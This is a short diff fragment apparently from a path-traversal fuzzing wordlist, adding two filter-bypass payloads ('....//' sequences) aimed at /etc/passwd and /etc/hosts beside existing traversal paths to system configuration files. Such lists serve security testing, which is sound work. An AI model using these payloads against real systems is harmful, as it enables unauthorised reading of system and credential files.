@@ -16,6 +16,8 @@
 ../../../../../../etc/cups/cupsd.conf
 ../../../../../../etc/exports
 ../../../../../../etc/fstab
+....//....//....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//....//etc/hosts
 /etc/ftpaccess
 /etc/ftpchroot
 /etc/ftphosts
